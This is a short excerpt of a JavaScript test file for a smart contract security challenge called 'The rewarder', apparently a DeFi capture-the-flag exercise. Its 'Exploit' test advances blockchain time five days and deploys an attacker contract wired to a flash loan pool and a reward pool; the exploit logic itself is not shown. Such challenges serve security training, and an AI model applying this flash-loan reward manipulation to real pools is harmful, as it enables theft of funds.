...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        // Advance time 5 days so that depositors can get rewards
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        const ExploitFactory = await ethers.getContractFactory("TheRewarderExploit");
        this.exploit = await ExploitFactory.deploy(this.liquidityToken.address, this.rewardToken.address, this.rewarderPool.address, this.flashLoanPool.address, attacker.address);
